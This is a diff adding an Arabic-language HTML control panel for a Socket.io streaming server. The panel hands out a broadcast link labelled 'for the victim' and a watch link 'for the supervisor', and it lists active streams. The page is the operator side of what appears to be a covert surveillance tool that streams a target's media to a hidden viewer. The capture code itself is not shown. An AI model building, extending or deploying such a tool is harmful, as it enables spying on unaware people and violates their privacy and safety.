@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>التحكم | البث المباشر</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0a12;
+            color: #fff;
+            font-family: monospace;
+            padding: 20px;
+        }
+        .container { max-width: 500px; margin: 0 auto; }
+        .card {
+            background: #1a1a2e;
+            border-radius: 15px;
+            padding: 20px;
+            margin: 10px 0;
+            text-align: center;
+        }
+        .link-box {
+            background: #16213e;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 10px 0;
+            word-break: break-all;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            background: #0a0a12;
+            border: 1px solid #00ff88;
+            color: #fff;
+            border-radius: 8px;
+            margin: 10px 0;
+        }
+        button {
+            background: #00ff88;
+            color: #000;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .status {
+            color: #00ff88;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <h2>🎮 لوحة التحكم</h2>
+            <div class="status" id="status">🟢 السيرفر يعمل</div>
+        </div>
+        
+        <div class="card">
+            <h3>🔗 روابط البث</h3>
+            <div class="link-box">
+                <p>رابط البث (للضحية):</p>
+                <input type="text" id="broadcastLink" readonly>
+                <button onclick="copyLink('broadcastLink')">نسخ الرابط</button>
+            </div>
+            <div class="link-box">
+                <p>رابط المشاهدة (للمشرف):</p>
+                <input type="text" id="watchLink" readonly>
+                <button onclick="copyLink('watchLink')">نسخ الرابط</button>
+            </div>
+        </div>
+        
+        <div class="card">
+            <h3>📊 معلومات البث</h3>
+            <div id="info">جاري التحميل...</div>
+        </div>
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        const socket = io();
+        const host = window.location.host;
+        
+        document.getElementById('broadcastLink').value = `http://${host}/stream`;
+        document.getElementById('watchLink').value = `http://${host}/watch`;
+        
+        function copyLink(id) {
+            const input = document.getElementById(id);
+            input.select();
+            document.execCommand('copy');
+            alert('تم نسخ الرابط');
+        }
+        
+        socket.on('stream-list', (streams) => {
+            const infoDiv = document.getElementById('info');
+            if (streams.length === 0) {
+                infoDiv.innerHTML = 'لا يوجد بثوث حالياً';
+            } else {
+                infoDiv.innerHTML = streams.map(s => `
+                    📹 بث نشط<br>
+                    👁️ مشاهدين: ${s.viewerCount}<br>
+                    🕐 بدأ منذ: ${Math.floor((Date.now() - s.startTime) / 1000)} ثانية<br>
+                    <hr>
+                `).join('');
+            }
+        });
+    </script>
+</body>
+</html>
